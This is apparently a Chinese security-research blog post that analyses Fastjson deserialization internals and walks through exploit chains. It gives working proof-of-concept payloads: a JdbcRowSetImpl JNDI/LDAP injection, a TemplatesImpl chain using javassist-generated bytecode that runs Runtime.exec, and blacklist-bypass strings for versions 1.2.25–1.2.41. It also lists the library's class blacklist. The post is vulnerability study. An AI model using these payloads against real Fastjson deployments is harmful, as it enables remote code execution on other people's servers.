<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;entity.User\&quot;,\&quot;name\&quot;:\&quot;leihehe\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parse(jsonString);</span><br><span class="line">System.out.println(obj2);</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112247858.png" alt="image-20220108112247858"></p>
<p>可见调用了constructor和set方法。</p>
<p>那么可以将恶意执行代码放在<code>User#setName()</code>里，就能执行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112504772.png" alt="image-20220108112504772"></p>
<h2 id="Setter和Getter调用的深入探究"><a href="#Setter和Getter调用的深入探究" class="headerlink" title="Setter和Getter调用的深入探究"></a>Setter和Getter调用的深入探究</h2><h3 id="JavaBeanInfo-build"><a href="#JavaBeanInfo-build" class="headerlink" title="JavaBeanInfo#build"></a>JavaBeanInfo#build</h3><p>Fastjson是如何调用对应的setter和getter的呢？</p>
<p>关键点在于JavaBeanInfo#build方法中</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108204218773.png" alt="image-20220108204218773"></p>
<p>因为我们传入的@type并不满足该条件，因此不会进入if里的语句。</p>
<h3 id="Setter"><a href="#Setter" class="headerlink" title="Setter"></a>Setter</h3><p>继续往下看，这里的methods实际是上面的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method[] methods = clazz.getMethods();<span class="comment">//获取到的是public的methods</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108204615107.png" alt="image-20220108204615107"></p>
<p>此处遍历了所有的methods，<strong>并要求满足以下条件</strong>：</p>
<blockquote>
<p><strong>method name的长度大于等于4</strong></p>
<p><strong>method只能有一种parameter</strong></p>
<p><strong>method并非static类型</strong></p>
<p><strong>method的返回类型必须为void或者当前method所在的class的类型</strong></p>
</blockquote>
<p>这样才能进入执行下面的语句</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108205558062.png" alt="image-20220108205558062"></p>
<p>根据不同的情况，会产生不同的propertyName，简单来说，都是依照java常见的书写方法的格式。</p>
<p>如果以上条件都不满足，则在method的第一个字符变为大写并在前面加上is作为field</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108210443480.png" alt="image-20220108210443480"></p>
<p>最后用add方法，将filed添加到filedInfo中</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108210555536.png" alt="image-20220108210555536"></p>
<h3 id="Getter"><a href="#Getter" class="headerlink" title="Getter"></a>Getter</h3><p>紧跟着的，是Getter的获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; var29; ++i) &#123;</span><br><span class="line">    method = var30[i];</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;</span><br><span class="line">        <span class="type">JSONField</span> <span class="variable">annotation</span> <span class="operator">=</span> (JSONField)method.getAnnotation(JSONField.class);</span><br><span class="line">        <span class="keyword">if</span> (annotation == <span class="literal">null</span> || !annotation.deserialize()) &#123;</span><br><span class="line">            String propertyName;</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="literal">null</span> &amp;&amp; annotation.name().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                propertyName = annotation.name();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fieldInfo = getField(fieldList, propertyName);</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">                    propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, (Field)<span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, (JSONField)<span class="literal">null</span>, (String)<span class="literal">null</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出被调用的getter需要<strong>满足以下要求</strong>:</p>
<blockquote>
<p>Method name &gt;=4</p>
<p>method不是static类型的</p>
<p>method name必须以get开头</p>
<p>method name的第四个字符必须是大写</p>
<p>method是无参的</p>
<p>method的返回类型是Collection、Map、AtomicBoolean、AtomicInteger、或AtomicLong中的任意一个</p>
</blockquote>
<p>最后会被添加到FieldInfo中</p>
<p>Build方法的最后会返回一个<code>JavaBeanInfo</code></p>
<p><code>return new JavaBeanInfo(clazz, builderClass, defaultConstructor, (Constructor)null, (Method)null, buildMethod, jsonType, fieldList);</code></p>
<h2 id="Fastjson的反序列化流程"><a href="#Fastjson的反序列化流程" class="headerlink" title="Fastjson的反序列化流程"></a>Fastjson的反序列化流程</h2><p>在<code>JSON.parse()</code>处下个断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164249197.png" alt="image-20220108164249197"></p>
<p>一直往下走，可以看见创建了<code>DefaultJSONParser</code>对象</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164603987.png" alt="image-20220108164603987"></p>
<p>跟进去看是如何创建的：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164636943.png" alt="image-20220108164636943"></p>
<p>这里会判断开头字符是否为<code>&#123;</code>，如果是，那么赋值token为12</p>
<p>接下来再进入parse()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164727601.png" alt="image-20220108164727601"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164746325.png" alt="image-20220108164746325"></p>
<p>因为之前token设置为12，所以跳入了case 12</p>
<p>创建一个新的<code>JSONObject</code>,并call到<code>parseObject()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164924577.png" alt="image-20220108164924577"></p>
<p>继续往下走：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108172115011.png" alt="image-20220108172115011"></p>
<p>在<code>TypeUtils#loadClass</code>中判断className，这里都不满足，因此跳过。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108173137665.png" alt="image-20220108173137665"></p>
<p><code>mappings.put(className, clazz);</code>将classname和对应的class放入mapping中，最后在进行反序列化。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108174017479.png" alt="image-20220108174017479"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108174039274.png" alt="image-20220108174039274"></p>
<h2 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h2><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p><code>JdbcRowSetImpl</code>可以配合JNDI+RMI或者JNDI+LDAP注入，如果不知道<a href="https://leihehe.top/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3-9/">JNDI注入的师傅可以看这里</a></p>
<p>在JdbcRowSetImpl.class的connect方法中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());<span class="comment">//此处是关键</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现了initialContext和lookup()，代表此处可以利用JNDI - 如果我们修改了<code>dataSourceName</code>为我们的RMI或者LDAP远程地址，那么就可以进行JNDI注入。</p>
<p>那么什么地方可以call到**connect()**呢</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在setAutoCommit方法中，会call到connect()方法。</p>
<h3 id="POC构造-4"><a href="#POC构造-4" class="headerlink" title="POC构造"></a>POC构造</h3><p>在之前的<strong>Fastjson的反序列化流程</strong>中，我们有说到fastjson可以调用public的set方法，<strong>那么我们就可以构造这样的一个</strong>jsonString</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parse(evilString);</span><br><span class="line"></span><br><span class="line">System.out.println(obj2);</span><br></pre></td></tr></table></figure>

<p>传入的json中，属性有dataSourceName和autoCommit，因此在使用<code>JSON.parse()</code>的时候，dataSource和autoCommit对应的<code>setDataSource()</code>和<code>autoCommit()</code>都会被call</p>
<p>从而能够执行以下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.lookup(<span class="string">&quot;ldap://127.0.0.1:7777/#EvilObject&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108201834255.png" alt="image-20220108201834255"></p>
<h2 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h2><h3 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>在cc链的分析中，我们多次用到了TemplatesImpl利用链，利用链如下</p>
<blockquote>
<p>TemplatesImpl#getOutputProperties()<br>  TemplatesImpl#newTransformer()<br>      TemplatesImpl#getTransletInstance()<br>          TemplatesImpl#defineTransletClasses()<br>              TransletClassLoader#defineClass()</p>
</blockquote>
<p>简单回顾一下，我们可以将生成的恶意字节码赋值给TemplatesImpl中的<code>_bytecodes</code>,最后在defineClass中，会将该恶意字节码读取进JVM中。</p>
<p>先写一个恶意字节码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getEvilCode</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">    classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">    ctClass.makeClassInitializer().insertBefore(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">    ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">    System.out.println(s);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>这里为什么要继承<strong>AbstractTranslet</strong>呢？</li>
</ol>
<p>我们在讲cc2链的时候说过，我们生成的恶意代码是在static代码块的，我们仍然需要让class对象被创建，这样才能执行我们的恶意代码。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127161222841.png" alt="img"></p>
<p>此处<strong>TemplatesImpl#getTransletInstance</strong>中，我们需要执行了<code>newInstance()</code>才能触发漏洞，而执行的字节码需要继承AbstractTranslet</p>
<ol start="2">
<li>为什么<strong>bytecodes</strong>最后需要用<strong>Base64</strong>编码？</li>
</ol>
<p>实际上fastjson在对field进行反序列化的时候，会进行base64解码，具体的我没有跟，有兴趣的师傅可以跟一下<code>FieldDeserializer#parseField</code></p>
<h3 id="POC构造与分析"><a href="#POC构造与分析" class="headerlink" title="POC构造与分析"></a>POC构造与分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getEvilCode</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">    classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">    ctClass.makeClassInitializer().insertBefore(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">    ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">    System.out.println(s);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        String evilJson=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+getEvilCode()+<span class="string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;leihehe\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;outputProperties\&quot;:&#123; &#125;&#125;\n&quot;</span>;</span><br><span class="line">        JSON.parseObject(evilJson,Object.class,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此处outputProperties会让fastjson找到getOuputProperties()，从而触发利用链。</p>
<p>但需要注意的是，在TemplatesImpl类中这几个方法是private的，所以我们需要开启<code>Feature.SupportNonPublicField</code>，这里也是导致<code>TemplatesImpl</code>链在fastjson反序列化漏洞利用中有所<strong>局限性</strong>的主要原因。</p>
<p>另外，在我们使用parseObject()时，需要指定为Object.class，否则返回的类型是JSONObject类型</p>
<p><code>JSON.parseObject()</code>和<code>JSON.parse()</code>需要满足的格式：</p>
<blockquote>
<p><code>JSON.parseObject(evilJson, Object.class, Feature.SupportNonPublicField);</code></p>
<p><code>JSON.parse(evilJson,Feature.SupportNonPublicField);</code></p>
</blockquote>
<p>后面的field基本上就是用反射的形式，设置value，例如<code>_bytecodes</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150412316.png" alt="image-20220109150412316"></p>
<p>最后的outputProperties也一样，最后通过反射执行。<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150849934.png" alt="image-20220109150849934"></p>
<p>弹出计算器</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150954388.png" alt="image-20220109150954388"></p>
<h2 id="总结两条利用链的区别"><a href="#总结两条利用链的区别" class="headerlink" title="总结两条利用链的区别"></a>总结两条利用链的区别</h2><p>TemplatesImpl</p>
<ul>
<li>当fastjson不出网时，可以盲打</li>
<li>版本在1.2.22起才有SupportNonPublicField特性,且要求在代码中开启SupportNonPublicField.</li>
</ul>
<p>JdbcRowSetImpl链</p>
<ul>
<li>利用范围更广</li>
<li>当fastjson不出网时，无法完成jndi注入，同时高版本中的jdk有一些限制，只能通过利用本地类来完成反序列化漏洞利用。</li>
</ul>
<h2 id="Fastjson各个版本分析"><a href="#Fastjson各个版本分析" class="headerlink" title="Fastjson各个版本分析"></a>Fastjson各个版本分析</h2><h3 id="1-2-25版本变化"><a href="#1-2-25版本变化" class="headerlink" title="1.2.25版本变化"></a>1.2.25版本变化</h3><p>可以发现在1.2.25中: <code>TypeUtils.loadClass()</code>被修改为了<code>checkAutoType()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214228148.png" alt="image-20220109214228148"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214347945.png" alt="image-20220109214347945"></p>
<p>1.2.25版本中，首先对autoTypeSupport布尔值进行判断，如果autoTypeSupport为true，那么开始检查黑名单和白名单，如果都不满足，则从Mapping中获取class。</p>
<p>如果autoTypeSupport为false，那么循环遍历白名单与黑名单，如果在黑名单中，则抛出异常，如果不在白名单中，则最后抛出<code>&quot;autoType is not support xxx&quot;</code>异常，因此如果autoTypeSupport为false，就一定无法执行成功。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109221758660.png" alt="image-20220109221758660"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214959269.png" alt="image-20220109214959269"></p>
<p>黑名单如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.<span class="comment">//这是templatesImpl和JdbcRowSetImpl所在的package</span></span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernat</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<h3 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h3><p>因为黑名单中有<code>com.sun</code>，因此想要<strong>直接</strong>绕过黑名单基本是不可能了</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109231952820.png" alt="image-20220109231952820"></p>
<p>我们需要寻找其他方法来避开黑名单的检测。此后的绕过过程我们都以JdbcRowSetImpl链来分析。另外，因为1.2.25后添加了autoTypeSupport Check，因此我们需要先将<code>autoTypeSupport</code>设为<strong>true</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(evilStr,Object.class);</span><br></pre></td></tr></table></figure>

<p>在第三行下个断点进行分析：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109233459957.png" alt="image-20220109233459957"></p>
<p>我们发现最后一定会进入<code>checkAutoType()</code></p>
<p>如果既不在白名单，也不再黑名单中，则会执行以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即call到TypeUtils#loadClass方法</p>
<p>但我们的所要进行反序列化的类都是在黑名单里面的，怎么办呢？</p>
<p>我们继续跟进loadClass看看。发现loadClass中有两个检测：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109233742373.png" alt="image-20220109233742373"></p>
<p><strong>如果是<code>[</code>开头的class name，就去掉<code>[</code>，并返回一个array类型的的新对象</strong></p>
<p><strong>如果是<code>L</code>开头、<code>;</code>结尾的class name，就去掉首尾，加载中间的class</strong></p>
<h4 id="方法一：以-开头"><a href="#方法一：以-开头" class="headerlink" title="方法一：以[开头"></a>方法一：以[开头</h4><p>那么我们试试以<code>[</code>开头</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235030406.png" alt="image-20220109235030406"></p>
<p>按照提示在后面加个<code>[</code>，报了一个新的错误，需要再添加一个<code>&#123;</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235105137.png" alt="image-20220109235105137"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235132417.png" alt="image-20220109235132417"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在计算器就可以成功弹出了。</p>
<p>这个POC看起来实在奇怪，fastjson是如何区别数组类型的参数的，为何以<code>[</code>开头，后面就一定要跟<code>[&#123;</code>，我猜测是在正常流程中，fastjson做了一些处理，让字符串以<code>[</code>开头，表示后面的是一串数组json，因此会去寻找<code>[&#123;</code></p>
<h4 id="方法二：以L开头-结尾"><a href="#方法二：以L开头-结尾" class="headerlink" title="方法二：以L开头;结尾"></a>方法二：以L开头;结尾</h4><p>前面有分析到，以<code>L</code>开头，<code>;</code>结尾的class name会被截取中间的部分，然后传入loadClass。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>那么我们可以构造以下的POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110124835115.png" alt="image-20220110124835115"></p>
<p>成功弹出计算器。</p>
<h3 id="1-2-42版本变化"><a href="#1-2-42版本变化" class="headerlink" title="1.2.42版本变化"></a>1.2.42版本变化</h3><p>在ParserConfig#checkAutoType()中，检测到<code>L</code>开头<code>;</code>结尾的classname，就会将首尾去掉，然后再放入黑名单中检查。</p>
<p>同时黑名单做了hash加密，但因为加密方式在<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>中能找到，所以可以自己写脚本进行hash碰撞。</p>
<p>这里已经有人<a href="https://github.com/LeadroyaL/fastjson-blacklist">整理出来了</a></p>
